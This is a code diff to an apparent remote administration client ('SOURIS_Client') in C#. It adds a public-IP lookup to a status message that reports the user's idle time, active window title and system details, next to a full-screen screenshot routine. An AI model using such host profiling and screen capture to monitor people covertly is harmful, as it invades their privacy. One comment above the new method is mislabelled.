@@ -11,6 +11,7 @@ using System.Drawing;
 using System.IO;
 using System.Windows.Forms;
 using System.Drawing.Imaging;
+using System.Net;
 
 namespace SOURIS_Client
 {
@@ -111,7 +112,7 @@ namespace SOURIS_Client
             string ramuse = RamUsage();
             string lastinput = GetLastInputTime();
             string activewindow = GetActiveWindowTitle();
-            string message = $"{machinename}|{country}|{ping}ms|{cpuuse}|{ramuse}|{lastinput}|{activewindow}";
+            string message = $"{machinename}|{country}|{ping}ms|{cpuuse}|{ramuse}|{lastinput}|{activewindow}|{GetIPAdress()}";
             return message;
         }
         //<---------------------------------Get Last input----------------------------->
@@ -121,20 +122,17 @@ namespace SOURIS_Client
             Bitmap resolution;
             resolution = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
             Size size = new Size(resolution.Width, resolution.Height);
-
-
             Graphics memoryGraphics = Graphics.FromImage(resolution);
-
             memoryGraphics.CopyFromScreen(0, 0, 0, 0, size);
-
             string savename = "";
-
             savename = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\Screenshot.png");
-
-
             resolution.Save(savename);
-
-
+        }
+        //<---------------------------------Get Last input----------------------------->
+        public static string GetIPAdress()
+        {
+            string jsoon = new WebClient().DownloadString("http://icanhazip.com");
+            return jsoon.ToString();
         }
     }
 }
